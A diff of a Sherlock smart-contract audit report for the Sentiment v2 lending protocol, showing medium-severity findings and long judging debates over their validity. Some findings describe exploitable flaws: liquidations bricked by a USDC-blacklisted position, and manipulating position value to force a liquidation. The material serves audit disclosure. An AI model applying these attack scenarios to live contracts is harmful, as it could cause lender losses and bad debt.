-According to [EIP-4626 specifications](https://eips.ethereum.org/EIPS/eip-4626):
-
-`maxWithdraw`
-```solidity
-MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST
- return 0.
- ```
- `maxRedeem`
- 
- ```solidity
-MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST
- return 0.
- ```
-
-
-But it is not enforced in our case and the `maxWithdraw` and `maxRedeem` functions are not having any logic to return 0 when to whole contract is paused and withdraw and redeem is disabled in that case.
-## Impact
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L220-L223
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L226-L232
-## Tool used
-
-Manual Review
-
-## Recommendation
-Include a logic for returning 0 when the contract is paused.
-
-# Issue M-23: None of the functions in SuperPool checks pause state 
+# Issue M-10: None of the functions in SuperPool checks pause state 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/270 
 
@@ -2572,12 +2523,496 @@ It is recommend to implemented pause state checking on some of the functions, fo
 +    function mint(uint256 shares, address receiver) public whenNotPaused nonReentrant returns (uint256 assets) {
 ```
 
-# Issue M-24: Exploiter can force user into unhealthy condition and liquidate him 
+# Issue M-11: Not removing a token from the position assets upon an owner removing a token from the known assets will cause huge issues 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/282 
+
+## Found by 
+000000, 0xAristos, Tendency, ThePharmacist, Yashar, iamandreiski, theweb3mechanic, tvdung94
+## Summary
+Not removing a token from the position assets upon an owner removing a token from the known assets will cause huge issues
+
+## Vulnerability Detail
+A user can add a token to his position assets to be used as collateral if that token is marked as known by the owner:
+```solidity
+    function toggleKnownAsset(address asset) external onlyOwner {
+        isKnownAsset[asset] = !isKnownAsset[asset];
+        emit ToggleKnownAsset(asset, isKnownAsset[asset]);
+    }
+```
+That token is added to the `positionAssets` set upon calling `Position::addToken()`:
+```solidity
+positionAssets.insert(asset);
+```
+An issue arises if the owner decides to later remove a particular asset from the known assets as that asset is not being removed from that set upon that happening. Since it is not being removed from that set, that token will still be used upon calculating the value of the user's collateral. The owner might decide to counteract that by removing the oracle for that asset however that will be even more problematic as liquidations for users using that token will be impossible as they will revert when oracle is equal to address(0).
+## Impact
+Not removing a token from the position assets upon an owner removing a token from the known assets will cause huge issues
+
+## Code Snippet
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L522-L525
+## Tool used
+
+Manual Review
+
+## Recommendation
+Remove the token from the set upon removing a token from the known assets. However, implementing some kind of a time delay before that finalizes will be important as otherwise, some users might immediately become liquidatable.
+
+
+
+
+## Discussion
+
+**samuraii77**
+
+Issue should not be duplicated to #71. I already have an issue duplicated to it and they are completely different - one is related to simply the action of removing an asset from the known assets not being very well thought out and causing stuck funds while this one is regarding the asset not being removed from the position assets of a user.
+
+**AtanasDimulski**
+
+Escalate, 
+Per the above [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/282#issuecomment-2352081497)
+
+**sherlock-admin3**
+
+> Escalate, 
+> Per the above [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/282#issuecomment-2352081497)
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+The Admin is Trusted and in this situation can call `removeToken()`:
+
+```solidity
+    /// @notice Remove asset from the list of tokens currrently held by the position
+    function removeToken(address asset) external onlyPositionManager {
+        positionAssets.remove(asset);
+    }
+```
+
+Planning to reject the escalation and invalidate the issue.
+
+**samuraii77**
+
+@cvetanovv, hi, this modifier allows only the position manager to call that function. If you take a look at the position manager, you will see that the only way to call that function is if you are authorised for a position which an owner is not, only the position owner is authorised (unless the position owner specifically authorises someone else) and the position owner is not a trusted entity, he is just a regular user.
+
+**cvetanovv**
+
+@z3s What do you think about this issue? 
+
+The root cause is the same as the main issue: removing a token from the known assets.
+The difference is that in one situation, the tokens remain stuck, and in this one, they are still used in the calculation of user collateral.
+
+
+**z3s**
+
+I think it's okay that they will be usable as collateral, and just stopping new deposits of that token is enough, because if admins just transfer user's collateral he would be liquidable. by fixing the root cause user can transfer the old tokens out and deposit some of supported tokens.
+
+**cvetanovv**
+
+Because of the Admin Input/call validation [rule](https://docs.sherlock.xyz/audits/judging/judging#vii.-list-of-issue-categories-that-are-not-considered-valid), this issue and #71 are invalid.
+
+> "An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue."
+
+Planning to reject the escalation and leave the issue as is.
+
+**samuraii77**
+
+Deleted my previous comments that I wrote as they didn't provide the information here.
+
+@cvetanovv, according to this rule, issue should be valid:
+
+>Admin functions are assumed to be used properly, unless a list of requirements is listed and it's incomplete or if there is no scenario where a permissioned funtion can be used properly.
+
+
+There is no scenario where this function can be used properly, thus it should be valid. The rule cited in the other issue and the issue itself both have a scenario where the function can be used properly:
+- the function in the other issue can be called when all tokens of the to be removed assets are withdrawn, thus no impact
+- the rule says that a contract pause causing someone to be unfairly liquidated is invalid. That is because the contract pause can be used without actually causing an issue in most cases
+
+However, for this issue; there is no such scenario where the function can be used properly, every single time would cause a huge issue and disruption of the protocol as assets can still be used as collateral and assets can directly be transferred to the position to increase collateral even when asset has been removed from known.
+
+**cvetanovv**
+
+I agree with the escalation that this issue is not a dup of #71. You can take a look at this comment: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/71#issuecomment-2371438397
+
+This issue will be the main issue, and I will duplicate #390 , #232 , #426 , #435 , #488, and #539. 
+
+The severity will be Medium because it does not meet the criteria for High: https://docs.sherlock.xyz/audits/judging/judging#iv.-how-to-identify-a-high-issue
+
+Planning to accept the escalation and duplicate #390 , #232 , #426 , #435 , #488, and #539 with this issue(#282)
+
+**iamandreiski**
+
+@cvetanovv - Hey, can you please take a look at issue #311 and consider it as a duplicate to this one as well, rather than #71 as it also mentions the same flow of a scenario being non-existent in which this function works properly and would disrupt the protocol in multiple ways. 
+
+**cvetanovv**
+
+@iamandreiski Yes, it could be a duplicate of this issue. You have captured the root cause: the admin cannot remove an asset. 
+
+I think #524 is also a valid dup.
+
+@z3s Can you check if other issues can be duplicated with this issue?
+
+**samuraii77**
+
+I don't see how #524 can be considered a duplicate. It is exactly the same as the other issue where assets are locked when an asset is removed from known. You can also see that the proposed mitigation fixes exactly that issue and is exactly the same fix as the one in the main issue that is being invalidated. 
+
+**Almur100**
+
+but there is no way to remove the oracle address from an asset in the RiskEngine contract. I have explained in the issue #214 
+
+**Almur100**
+
+PositionManager’s owner can make an asset known or unknown by calling the function toggleKnownAsset in the PositionManager contract . Now if the PositionManager owner can make an asset unknown(Before this asset was known), then this asset’s oracle address should also be removed from the RiskEngine contract. If this asset’s oracle address is not removed , then pools can be created with this asset, lender will deposit this asset, borrower will borrow this asset but borrower will not be able to withdraw this asset as the asset is not supported by the PositionManager contract. Here the bug is there is no way to remove the oracle address from an asset in the RiskEngine contract.see the issue #214 
+
+**Almur100**
+
+When a new pool is created with an asset, there is no check that the asset must be supported by the PositionManager contract. There is only check that the oracle address must exist for the asset in the RiskEngine contract.so PositionManager contract’s owner must set those assets as known which has an oracle address in the RiskEngine contract.if any asset which is supported by RiskEngine contract , but not supported by PositionManager contract, in this situation if users borrows that token , then users can’t withdraw that asset from the position.see the issue #214
+
+
+
+**cvetanovv**
+
+I agree that #524 is not a duplicate of #282. 
+
+Regarding #214, you can see why it is invalid, and I won't duplicate it with the others from this sponsor's comment: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/71#issuecomment-2373949846
+
+My last comment remains with the escalation decision, and I will add #311 to it: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/282#issuecomment-2371455468
+
+Planning to accept the escalation and duplicate #390 , #232 , #426 , #435 , #488, #539, and #311 with this issue(#282).
+
+
+**iamandreiski**
+
+@cvetanovv Thanks a lot for the prompt decision, just a small correction on the above statement (a typo in the issue numbers on the last sentence) -> Issue 311 should be duplicated, not 319. :) 
+
+**cvetanovv**
+
+> @cvetanovv Thanks a lot for the prompt decision, just a small correction on the above statement (a typo in the issue numbers on the last sentence) -> Issue 311 should be duplicated, not 319. :)
+
+Thanks for the correction.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [AtanasDimulski](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/282/#issuecomment-2352304666): accepted
+
+# Issue M-12: Liquidations will revert if a position has been blacklisted for USDC 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/284 
+
+## Found by 
+000000, iamnmt
+## Summary
+Liquidations will revert if a position has been blacklisted for USDC
+## Vulnerability Detail
+Upon liquidations, we call the following function:
+```solidity
+function _transferAssetsToLiquidator(address position, AssetData[] calldata assetData) internal {
+        // transfer position assets to the liquidator and accrue protocol liquidation fees
+        uint256 assetDataLength = assetData.length;
+        for (uint256 i; i < assetDataLength; ++i) {
+            // ensure assetData[i] is in the position asset list
+            if (Position(payable(position)).hasAsset(assetData[i].asset) == false) {
+                revert PositionManager_SeizeInvalidAsset(position, assetData[i].asset);
+            }
+            // compute fee amt
+            // [ROUND] liquidation fee is rounded down, in favor of the liquidator
+            uint256 fee = liquidationFee.mulDiv(assetData[i].amt, 1e18);
+            // transfer fee amt to protocol
+            Position(payable(position)).transfer(owner(), assetData[i].asset, fee);
+            // transfer difference to the liquidator
+            Position(payable(position)).transfer(msg.sender, assetData[i].asset, assetData[i].amt - fee);
+        }
+    }
+```
+As seen, we call `transfer()` on the `Position` contract which just transfers the specified amount of funds to the provided receiver. As mentioned in the contest README, USDC will be whitelisted for the protocol. If the `position` address is blacklisted for USDC, this transcation would fail and the liquidation for that user would brick. The user in charge of that position could increase his chance of getting blacklisted by using the `exec()` function which calls a particular function on a target (both have to be whitelisted by an owner). If they do malicious stuff and even worse, manage to find a vulnerability that they can exploit on the allowed target, they might get blacklisted which would brick liquidations for them, especially if their only deposited collateral token is USDC.
+
+Even worse, every user can call `addToken()` for USDC without having to deposit any USDC nor to have any USDC balance making this attack free, the only thing the user needs to make happen is to get blacklisted.
+## Impact
+Liquidations will revert if a position has been blacklisted for USDC. Likelihood - low, impact - high
+## Code Snippet
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L478
+## Tool used
+
+Manual Review
+
+## Recommendation
+Fix is not trivial but an option is implementing a try/catch block and additional checks in order to not make the liquidator unwillingly repay the debt while not receiving the collateral.
+
+
+
+## Discussion
+
+**sherlock-admin3**
+
+1 comment(s) were left on this issue during the judging contest.
+
+**z3s** commented:
+> #258
+
+
+
+**samuraii77**
+
+Escalate
+
+The judge has said that the issue is not valid as the protocol is trusted and won't get blacklisted. That is not important for my issue at all, a user could get his position blacklisted using the way explained in my report.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> The judge has said that the issue is not valid as the protocol is trusted and won't get blacklisted. That is not important for my issue at all, a user could get his position blacklisted using the way explained in my report.
+
+The escalation could not be created because you are not exceeding the escalation threshold.
+
+You can view the required number of additional valid issues/judging contest payouts in your Profile page,
+in the [Sherlock webapp](https://app.sherlock.xyz/audits/).
+
+
+**AtanasDimulski**
+
+Escalate,
+Per the above [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/284#issuecomment-2351851715)
+
+**sherlock-admin3**
+
+> Escalate,
+> Per the above [comment](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/284#issuecomment-2351851715)
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+I agree that the point here is that tokens can be blacklisted not by the protocol but by the tokens themselves if they do malicious things. 
+
+The owner of these tokens will still be able to do borrowing but will not be able to be liquidated.
+
+Planning to accept the escalation, duplicate this issue with #258, and make a valid Medium.
+
+**WangSecurity**
+
+Result: 
+Medium
+Has duplicates
+
+**sherlock-admin2**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [AtanasDimulski](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/284/#issuecomment-2352308356): accepted
+
+**0xjuaan**
+
+Hi @WangSecurity @cvetanovv sorry this is a late message, but I don't think its valid to say that the position contract will be blacklisted. The allowed function calls that can be called via `exec()` are given [here](https://gist.github.com/ruvaag/58c9fc2e5c139451c83c21fda27b77a2). 
+
+These are normal DeFi functions on GMX and Pendle, so USDC will not blacklist the position upon calling any of these since they can't do anything malicious.
+
+[Here](https://docs.sherlock.xyz/audits/judging/judging#vii.-list-of-issue-categories-that-are-not-considered-valid) are the sherlock rules regarding blacklists:
+> Contract / Admin Address Blacklisting / Freezing: If a protocol's smart contracts or admin addresses get added to a "blacklist" and the functionality of the protocol is affected by this blacklist, this is not considered a valid issue.
+
+The only exception is when a pre-blacklisted address can be used to cause harm to the protocol, like [this example](https://github.com/sherlock-audit/2022-11-opyn-judging/issues/219). In this issue however, the blacklist occurs on a protocol contract (the Position contract), so it should be invalidated.
+
+
+
+**cvetanovv**
+
+@0xjuaan Yeah, you're right in this case, maybe there's no harm for the protocol.
+
+@samuraii77 Can you give your opinion?
+
+**samuraii77**
+
+@cvetanovv, firstly, the rule cited is not of significance here as there is clearly harm for everyone if the position gets blacklisted, liquidations won't be possible for that position which is detrimental. 
+
+Now, the question would be whether the position can get blacklisted. As explained in the report, there is an `exec()` function which allows freely calling a few functions on a few target addresses.
+>These are normal DeFi functions on GMX and Pendle
+
+Yes, they are normal functions, never claimed otherwise and not sure what else would they be other than normal functions.
+
+>so USDC will not blacklist the position upon calling any of these since they can't do anything malicious.
+
+Yes, USDC will not blacklist the position if the user __can't__ do anything malicious. However, why would you assume he can't do anything malicious? We have a total of 6 functions currently allowed (very likely that this would increase in the future). As with how common hacks are in DeFi, we can't assume that there is nothing that can be abused in these 6 functions. It is definitely not an unlikely assumption that using those 6 functions, a user would be able to do malicious stuff which would cause his position to get blacklisted. Furthermore, these functions allow completely handling control of the execution using native ETH so that essentially gives the user the ability to call any contract they would like.
+
+If we take a look at the rules to identify a medium severity issue, we are clearly meeting those requirements with this issue:
+>Causes a loss of funds but requires certain external conditions or specific states
+
+This issue is definitely not of a high likelihood, that's why I have submitted it as a medium. It is of low likelihood (but definitely not low enough to be assumed to not happen) but high impact, a medium severity is perfectly appropriate.
+
+I also believe that any disagreements about the validity of the issue must have been made while the issue was escalated, not afterwards.
+
+**0xjuaan**
+
+@samuraii77 do you have a concrete example of a malicious action that can occur through exec() that would cause the position to be blacklisted?
+
+**0xjuaan**
+
+@cvetanovv @WangSecurity  just pinging as a reminder so this does not go unnoticed since the escalation was already resolved.
+
+**cvetanovv**
+
+> @samuraii77 do you have a concrete example of a malicious action that can occur through exec() that would cause the position to be blacklisted?
+
+@samuraii77 Can you respond to this comment by @0xjuaan?
+
+**samuraii77**
+
+I wouldn't share such a malicious action in a public repo for everyone to see, if I knew of a vulnerability in those target contracts, I would disclose it to the respective protocols, not here. 
+
+Either way, I don't think that's of significance here, whether I know of such a malicious action or not does not matter, we are looking for issues in this particular protocol, not in external protocols. The issue is in this protocol, assuming the position is not blacklisted when tokens like USDC are to be used, to be precise. Not only such an assumption was made but users have the opportunity to interact with external protocols using the `exec()` functionality as already mentioned which significantly increases chances of the position getting blacklisted. Users can also freely add `USDC` as their position assets without having to deposit any tokens due to the protocol design, this also decreases the risk the users has to take in order to try and make this attack.
+
+I believe we clearly fall under the following rule:
+>Causes a loss of funds but requires certain external conditions or specific states
+
+
+**neko-nyaa**
+
+The "Position" contract belongs to the user, not to the protocol. The protocol gives the contract to the user so that they can create a position within the protocol. Since the admin does not have control over the Position contract, it can no longer be considered a "protocol's smart contracts".
+
+The rule about blacklisting causing harm also never mentions the pre-blacklisting as a requirement. In this case, if the Position is blacklisted, then the undercollateralized borrower "used a blacklisted address" and "caused harm to a protocol functioning". The protocol functioning is liquidation, the harm is the function being denied, the impact is undercollateralized i.e. bad debt borrowing.
+
+**cvetanovv**
+
+I agree with @samuraii77, and I will keep this issue valid.
+
+However, if a user's position address is blacklisted, it can indeed harm the protocol by preventing liquidations, which could result in bad debt. 
+
+**0xjuaan**
+
+@cvetanovv what about the sherlock rule? 
+
+> Contract / Admin Address Blacklisting / Freezing: If a protocol's smart contracts or admin addresses get added to a "blacklist" and the functionality of the protocol is affected by this blacklist, this is not considered a valid issue.
+
+The Position contract is deployed by the protocol, using the protocol's implementation contract, so it cannot be assumed that the contract will be blacklisted. That's why the rule was made. Otherwise I can say that if a Pool gets blacklisted, users USDC will be stuck forever, and that should be a valid issue.
+
+cc @WangSecurity
+
+**samuraii77**
+
+Just the fact that it was deployed by the protocol does not make it the protocol's contract. The position is in full control of the position owner who is not a trusted entity, the protocol has absolutely nothing to do with it and has no control over it. 
+
+As a matter of fact, it is not even deployed by the protocol. It is deployed by the PositionManager contract at the will of a regular user through __the user__ calling the respective function for creating a new position.
+
+**cvetanovv**
+
+> @cvetanovv what about the sherlock rule?
+> 
+> > Contract / Admin Address Blacklisting / Freezing: If a protocol's smart contracts or admin addresses get added to a "blacklist" and the functionality of the protocol is affected by this blacklist, this is not considered a valid issue.
+> 
+> The Position contract is deployed by the protocol, using the protocol's implementation contract, so it cannot be assumed that the contract will be blacklisted. That's why the rule was made. Otherwise I can say that if a Pool gets blacklisted, users USDC will be stuck forever, and that should be a valid issue.
+> 
+> cc @WangSecurity
+
+You have not quoted the whole rule, here is the further part:
+> However, there could be cases where an attacker would use a blacklisted address to cause harm to a protocol functioning. [Example(Valid)](https://github.com/sherlock-audit/2022-11-opyn-judging/issues/219)
+
+Watson has given an example of how being blacklisted can hurt the protocol (getting into bad debt).
+
+**0xjuaan**
+
+@cvetanovv if you look at that example, it involves using a pre-blacklisted address which is a non-protocol address.
+
+this issue does not fit that example since this involves protocol smart contracts being blacklisted.
+
+**samuraii77**
+
+As I mentioned, this is not at all a protocol smart contract. It is deployed at the will of a user and the user is the owner of the contract. I don't understand why you keep saying that this is the protocol's smart contract when they have no control over it. They are not even the ones deploying it, it is deployed by the `PositionManager` contract at the will of __the user__ and the ownership is solely the __user's__, there is absolutely no correlation between the protocol and the `Position` contract. 
+
+**0xjuaan**
+
+@samuraii77 it's a protocol smart contract because it's deployed by a protocol smart contract, with implementation defined by the protocol- the fact that a user triggers it does not matter. there's no way to get the contract blacklisted because it cant do anything malicious.
+
+i'm not gonna speak on this issue anymore, if it gets validated its a failure to understand the guidelines in the rules.
+
+**cvetanovv**
+
+@0xjuaan @samuraii77 To be fair, I'll ask HoJ to look at the issue and give his opinion. I may be misinterpreting the rule.
+
+**cvetanovv**
+
+After reviewing the situation and considering HoJ's feedback, I agree that this issue should be marked as invalid.
+
+The core argument that the Position contract could get blacklisted lacks a concrete, realistic example of how this could happen through the currently allowed functions. Without a valid path to demonstrate how the `exec()` function or external protocol interactions could lead to blacklisting, this scenario remains highly speculative.
+
+Furthermore, USDC's [blacklist policy](https://www.circle.com/hubfs/Blog%20Posts/Circle%20Stablecoin%20Access%20Denial%20Policy_pdf.pdf) targets only severe cases, and there is no evidence to suggest that a Position contract, triggered by standard DeFi interactions, would fall under this category. 
+
+With only a small number of addresses blacklisted by USDC, this situation seems too rare to consider a genuine threat. There are only 12 addresses added since the beginning of the year. With millions of users using USDC, this can be a rare edge case - https://dune.com/phabc/usdc-banned-addresses. For the above reasons, we consider the issue Low severity.
+
+We will reject escalation, and this issue will remain invalid.
+
+**samuraii77**
+
+I believe the blacklist policy shown further makes my issue more valid. We can see that addresses can get blacklisted not only if they commit on-chain but also based on different requests from jurisdictions, countries, governments, etc. which only increases the likelihood and doesn't decrease it, thus the `exec()` functionality allowing malicious actions is not a prerequisite to the issue, it is only a boost to the likelihood.
+
+For example, by searching on the internet, here are some sitautions where a blacklist can occur that is not related to an on-chain hack:
+- law enforcement requests
+- sanctions compliance (sanctioned individuals, sanctioned countries)
+- wallets associated with financing illegal activities
+- addresses linked to ransomware attacks
+- money laundering operations
+- regulatory compliance
+- and more
+
+Nothing stops such a person conducting illegal activities from being linked to the position contract. As the position contract is fully in control and possession of an untrusted user, we can assume that a link between the position contract and such an entity is probable.
+
+An address can even get blacklisted by stealing 1,000,000$ from a smart contract and then send the funds over to the position. As USDC/Circle does not want those funds to be transferred, that will cause the position to get blacklisted. If that wasn't the case and USDC wouldn't blacklist such positions, then that means that every attacker can abuse this and transfer their funds to such a position to avoid getting blacklisted - this is clearly not the case and such positions will get the same treatment as a regular address. Thus, there are many different situations where a position can get blacklisted on top of the `exec()` functionality which makes it even more likely. It is definitely not an imaginary event but an actual scenario that can occur. All issues related to USDC have a low likelihood by default, it is not much different here.
+
+Furthermore, the amount of number of addresses getting blacklisted by USDC is not a valid argument. I am not claiming that it happens often, otherwise that would be a high severity issue. The rules are clear regarding this, if a blacklist harms users other than the one blacklisted, it is valid - that is precisely the scenario here.
+
+The protocol design is clearly flawed in terms of that scenario and it allows the discussed scenario to occur, this should be a valid medium severity issue.
+
+**cvetanovv**
+
+After careful review, I agree with the reasoning presented by @samuraii77.
+
+The potential for a position to be blacklisted can arise from various realistic scenarios beyond just on-chain activities. Legal requests, sanctions compliance, and regulatory measures can all contribute to blacklisting risks. According to the rules, if a blacklisting harms the functioning of the protocol and not just the affected individual, it is considered a valid issue.
+
+In this case, the user could intentionally get blacklisted, potentially causing harm to the protocol's liquidation process. This aligns with the rule that states, "there could be cases where an attacker would use a blacklisted address to cause harm to a protocol functioning."
+
+He has control over getting himself blacklisted and causing harm to the protocol, which according to the rules is a valid issue.
+
+My decision is to keep the issue as it is.
+
+**0xjuaan**
+
+>  According to the rules, if a blacklisting harms the functioning of the protocol and not just the affected individual, it is considered a valid issue.
+
+@cvetanovv If you read the rule again, it says "If a protocol's smart contracts or admin addresses get added to a "blacklist" and the functionality of the protocol is affected by this blacklist, this is NOT considered a valid issue." which is the exact opposite of your statement.
+
+
+
+
+**samuraii77**
+
+@0xjuaan, you are misinterpreting the rule as I told you a few times. Judging by your logic, an account abstraction contract, that is fully in control of a user, is a protocol's smart contract as it gets deployed by a factory even though it is completely in control of a user.
+
+The rule is about contracts that are in control of the protocol, for example a protocol contract owning USDC to lend out to users getting blacklisted, that would not be a valid submission as that contract is the protocol's.
+
+# Issue M-13: Exploiter can force user into unhealthy condition and liquidate him 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/299 
 
+The protocol has acknowledged this issue.
+
 ## Found by 
-EgisSecurity
+A2-security, EgisSecurity, Flare, hash
 ### Summary
 
 Protocol implements a flexible cross-margin portfolio managment with the help of `Position` smart contract, which should hold borrower's collateral and debt positions. 
@@ -2652,173 +3087,23 @@ _No response_
 
 Introduce virtual balance inside position, which is updated on deposit/withdraw actions. This will prevent manipulations of the weighted average tvl due to donations. 
 
-# Issue M-25: In liquidateBadDebt, transferring all the assets from the position to the protocol’s owner is unfair to the lender, as it increases the lender’s losses. 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/307 
+
+## Discussion
+
+**elhajin**
+
+https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/558#issuecomment-2351838364
+
+
+# Issue M-14: Under certain circumstances bad debt will cause first depositor to lose funds 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/319 
 
 The protocol has acknowledged this issue.
 
 ## Found by 
-4rdiii, AlexCzm, Hearmen, Honour, KupiaSec, Mykola-ops, S3v3ru5, ZeroTrust, dhank, h2134, jennifer37
-## Summary
-In liquidateBadDebt, all the assets from the position are transferred to the protocol’s owner, while the lender bears the full loss of the entire borrowed amount, not just the under-collateralized portion (i.e., debtValue - assetValue). This results in an unfair outcome for the lender.
-
-## Vulnerability Detail
-```javascript
-function liquidateBadDebt(address position) external onlyOwner {
-        riskEngine.validateBadDebt(position);
-
-        // transfer any remaining position assets to the PositionManager owner
-        address[] memory positionAssets = Position(payable(position)).getPositionAssets();
-        uint256 positionAssetsLength = positionAssets.length;
-        for (uint256 i; i < positionAssetsLength; ++i) {
-            uint256 amt = IERC20(positionAssets[i]).balanceOf(position);
-@>>            try Position(payable(position)).transfer(owner(), positionAssets[i], amt) { } catch { }
-        }
-
-        // clear all debt associated with the given position
-        uint256[] memory debtPools = Position(payable(position)).getDebtPools();
-        uint256 debtPoolsLength = debtPools.length;
-        for (uint256 i; i < debtPoolsLength; ++i) {
-@>>            pool.rebalanceBadDebt(debtPools[i], position);
-@>>            Position(payable(position)).repay(debtPools[i], type(uint256).max);
-        }
-    }
-```
-We can see in the liquidateBadDebt function that all of the position’s assets are transferred to the owner, but none of the debt is actually repaid.
-```javascript
-  function rebalanceBadDebt(uint256 poolId, address position) external {
-        PoolData storage pool = poolDataFor[poolId];
-        accrue(pool, poolId);
-
-        // revert if the caller is not the position manager
-        if (msg.sender != positionManager) revert Pool_OnlyPositionManager(poolId, msg.sender);
-
-        // compute pool and position debt in shares and assets
-        uint256 totalBorrowShares = pool.totalBorrowShares;
-        uint256 totalBorrowAssets = pool.totalBorrowAssets;
-        uint256 borrowShares = borrowSharesOf[poolId][position];
-        // [ROUND] round up against lenders
-        uint256 borrowAssets = _convertToAssets(borrowShares, totalBorrowAssets, totalBorrowShares, Math.Rounding.Up);
-
-        // rebalance bad debt across lenders
-@>>        pool.totalBorrowShares = totalBorrowShares - borrowShares;
-        // handle borrowAssets being rounded up to be greater than totalBorrowAssets
-@>>        pool.totalBorrowAssets = (totalBorrowAssets > borrowAssets) ? totalBorrowAssets - borrowAssets : 0;
-        uint256 totalDepositAssets = pool.totalDepositAssets;
-@>>        pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
-        borrowSharesOf[poolId][position] = 0;
-    }
-```
-In the rebalanceBadDebt function, the debt is only cleared at the accounting level, without transferring the actual funds needed to repay the debt. Directly reducing borrowAssets from totalDepositAssets forces all lenders to bear the loss of the borrowed funds.
-
-```javascript
- function repay(uint256 poolId, uint256) external onlyPositionManager {
-        if (POOL.getBorrowsOf(poolId, address(this)) == 0) debtPools.remove(poolId);
-    }
-```
-We can see that in the position.repay() function, there is also no actual transfer of funds to repay the debt.
-## Impact
-The lender bears the full loss of the borrowed funds, not just the under-collateralized portion (i.e., debtValue - assetValue), while the owner profits. This is extremely unfair to the lender.
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L446
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L528
-## Tool used
-
-Manual Review
-
-## Recommendation
-The protocol should either repay all of the debt or sell the position’s collateral (assets) into the debt token to cover the outstanding debt.
-
-# Issue M-26: The liquidate() function requires that after liquidation, the position must be in a healthy state. This may result in certain positions never being liquidated if they cannot reach a healthy state, potentially leaving them in limbo. 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/309 
-
-## Found by 
-ZeroTrust
-
-## Summary
-Since the position’s funds are discounted during liquidation, this could further deteriorate the position’s health instead of restoring it. As a result, the lender’s funds could be exposed to even greater risk, rather than mitigating the situation as intended.
-## Vulnerability Detail
-```javascript
-    function liquidate(
-        address position,
-        DebtData[] calldata debtData,
-        AssetData[] calldata assetData
-    ) external nonReentrant {
-        riskEngine.validateLiquidation(position, debtData, assetData);
-
-        // liquidate
-        _transferAssetsToLiquidator(position, assetData);
-        _repayPositionDebt(position, debtData);
-
-        // position should be within risk thresholds after liquidation
-@>>        if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
-        emit Liquidation(position, msg.sender, ownerOf[position]);
-    }
-```
-We can see that the liquidate() function requires the position to be in a healthy state after liquidation. Although liquidators are given the opportunity to acquire collateral at a discounted price (e.g., 10%), because the position must be restored to a healthy state after liquidation, the liquidator’s profit in some cases may be very small or even nonexistent. This lack of incentive for the liquidator could result in certain positions remaining unliquidated, leading to further losses for the lender.
-
-Proof of Concept (POC):
-
-Let’s take an example scenario:
-
-Assume an asset has an LTV of 98%, a price of 1, and a quantity of 100.
-
-The borrow token quantity is 98, with a price of 1, and the borrowed amount is 98.
-
-The loan value is 98, and the minimum collateral value is 100.
-
-The position is currently in a healthy state.
-
-
-When the price drops by 1.5%, i.e., the price becomes 0.985, the collateral value is 98.5, which is less than 100.
-
-At this point, the position becomes eligible for liquidation.
-
-The liquidator’s profit from liquidating the entire position would be 1. However, the discounted price is calculated as   1-98.5/99 = 0.5% , which results in a 0.5% discount—far below the expected 10%. This might not be sufficient to motivate the liquidator to liquidate the position.
-
-As a result, if the price drops further, the liquidator’s profit decreases even more. In the volatile world of cryptocurrencies, a 20%-30% price drop is common during market crashes, which could lead to a large number of positions becoming unliquidatable.
-
-If the liquidator liquidates a portion of the position at a discounted price (10%), it would actually make the position even more unhealthy, causing the transaction to revert.
-
-For example, if the liquidator tries to liquidate 10 borrow tokens, they would need to acquire collateral equivalent to:
-
-
-10*1/（0.985 *（1-10%）） = 11.28
-
-
-The remaining position would be:
-
-	•	Borrow tokens: 88
-	•	Required collateral: 89.7959
-	•	Remaining collateral: 88.71968
-	•	Value of remaining collateral: 87.3888
-
